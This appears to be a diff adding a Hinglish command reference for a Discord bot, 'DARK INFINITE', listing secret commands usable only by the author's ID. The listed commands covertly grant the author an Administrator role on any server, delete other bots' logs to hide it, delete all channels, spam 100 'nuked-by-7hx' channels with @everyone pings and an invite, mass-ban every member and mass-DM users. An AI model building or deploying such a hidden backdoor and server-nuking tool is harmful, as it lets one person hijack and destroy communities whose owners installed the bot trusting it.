@@ -1,0 +1,63 @@
+====================================================
+  DARK INFINITE — Mere Custom Commands
+  (Sirf meri ID: 1255716509443948648)
+====================================================
+
+1. >GETADMIN
+   Aliases: >giveadmin  >adminme  >ownerrole
+   Kaam: Server mein "7hx" naam ka red Administrator
+         role banata hai, aur mujhe deta hai.
+         Role automatically sabse upar jaata hai.
+         Mera command delete ho jaata hai.
+         Dusre bots ke logs bhi delete ho jaate hain
+         (role create, message delete wale sab).
+   Usage: >getadmin             (current server)
+          >getadmin <server_id> (koi bhi server)
+   Access: SIRF MERI ID
+
+----------------------------------------------------
+
+2. >NUKECHANNELS
+   Aliases: >deleteallchannels  >clearchannels
+   Kaam: 1. Sabko DM bhejta hai "server nuke" embed
+         2. Saare channels delete karta hai
+         3. 100 naye "nuked-by-7hx" channels banata hai
+         4. Har channel mein @everyone + red embed
+            + discord.gg/S5DDGwfWP6 link
+         5. Har channel ka message PIN hota hai
+   Usage: >nukechannels
+   Access: SIRF MERI ID
+
+----------------------------------------------------
+
+3. >MASSBAN
+   Aliases: >banall  >nukemembers
+   Kaam: 1. Ban karne se pehle har member ko DM
+         2. Phir saare members ban ho jaate hain
+   Usage: >massban
+   Access: SIRF MERI ID
+
+----------------------------------------------------
+
+4. >SENDDM
+   Aliases: >botdm  >userdm
+   Kaam: Kisi specific user ko bot ke through DM
+         bhejta hai (embed format mein).
+   Usage: >senddm @user message
+          >senddm USER_ID message
+   Access: MERI ID + Server ka Real Owner
+
+----------------------------------------------------
+
+5. >MASSDM
+   Aliases: >announcedm  >dmall
+   Kaam: Current server ke SAARE members ko ek
+         saath DM bhejta hai.
+   Usage: >massdm <message>
+   Access: MERI ID + Server ka Real Owner
+
+====================================================
+  Server Invite: https://discord.gg/S5DDGwfWP6
+  Bot Token: (Replit Secrets mein 'TOKEN')
+  GROQ API:  (Replit Secrets mein 'GROQ_API_KEY')
+====================================================
